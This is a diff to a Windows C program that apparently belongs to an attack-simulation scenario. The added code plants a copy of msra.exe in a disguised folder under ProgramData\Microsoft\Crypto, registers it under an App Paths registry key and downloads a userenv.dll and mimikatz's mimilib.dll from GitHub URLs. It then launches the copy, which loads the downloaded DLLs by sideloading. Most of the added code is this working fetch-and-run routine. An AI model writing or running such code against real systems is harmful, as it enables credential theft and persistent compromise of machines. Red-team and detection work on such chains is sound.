@@ -2,6 +2,9 @@
 #include <stdio.h>
 #include <conio.h>
 #include <tlhelp32.h>
+#include <urlmon.h>
+
+#pragma comment(lib, "urlmon.lib")
 
 BOOL WINAPI IsUserAnAdmin(void);
 
@@ -16,7 +19,6 @@ int main(void) {
 
     printf("[+] Running in Elevated Session.\n");
 
-    // get parent PID
     DWORD parentPID = 0;
     DWORD myPID = GetCurrentProcessId();
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -49,6 +51,70 @@ int main(void) {
     }
 
     printf("[+] Parent PID: %lu (%s)\n", parentPID, parentName);
+
+    const char *targetDir = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18";
+    char targetMsra[MAX_PATH];
+    char targetUserenv[MAX_PATH];
+    char targetMimilib[MAX_PATH];
+    wsprintfA(targetMsra, "%s\\msra.exe", targetDir);
+    wsprintfA(targetUserenv, "%s\\userenv.dll", targetDir);
+    wsprintfA(targetMimilib, "%s\\mimilib.dll", targetDir);
+
+    if (!CreateDirectoryA(targetDir, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
+        printf("[-] Failed to create directory (%lu)\n", GetLastError());
+        return 1;
+    }
+    printf("[+] Directory created: %s\n", targetDir);
+
+    if (!CopyFileA("C:\\Windows\\System32\\msra.exe", targetMsra, FALSE)) {
+        printf("[-] Failed to copy msra.exe (%lu)\n", GetLastError());
+        return 1;
+    }
+    printf("[+] msra.exe copied\n");
+
+    HKEY hKey;
+    LONG regRet = RegCreateKeyExA(HKEY_LOCAL_MACHINE,
+        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msra.exe",
+        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
+    if (regRet != ERROR_SUCCESS) {
+        printf("[-] Failed to open registry key (%ld)\n", regRet);
+        return 1;
+    }
+    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)targetMsra, lstrlenA(targetMsra) + 1);
+    RegCloseKey(hKey);
+    printf("[+] Registry key set\n");
+
+    const char *dllBaseUrl = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main";
+    char dllUrl[MAX_PATH];
+    wsprintfA(dllUrl, "%s/userenv.dll", dllBaseUrl);
+    printf("[+] Downloading userenv.dll...\n");
+    HRESULT hr = URLDownloadToFileA(NULL, dllUrl, targetUserenv, 0, NULL);
+    if (hr != S_OK) {
+        printf("[-] userenv.dll download failed (0x%lx)\n", hr);
+        return 1;
+    }
+    printf("[+] userenv.dll downloaded\n");
+
+    printf("[+] Downloading mimilib.dll...\n");
+    hr = URLDownloadToFileA(NULL,
+        "https://raw.githubusercontent.com/ParrotSec/mimikatz/master/x64/mimilib.dll",
+        targetMimilib, 0, NULL);
+    if (hr != S_OK) {
+        printf("[-] mimilib.dll download failed (0x%lx)\n", hr);
+        return 1;
+    }
+    printf("[+] mimilib.dll downloaded\n");
+
+    STARTUPINFOA si = { .cb = sizeof(si) };
+    PROCESS_INFORMATION pi;
+    if (CreateProcessA(targetMsra, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        printf("[+] msra.exe launched (PID: %lu)\n", pi.dwProcessId);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    } else {
+        printf("[-] Failed to launch msra.exe (%lu)\n", GetLastError());
+    }
+
     printf("Press 'q' to exit\n");
     Sleep(200);
     while (_getch() != 'q') {}
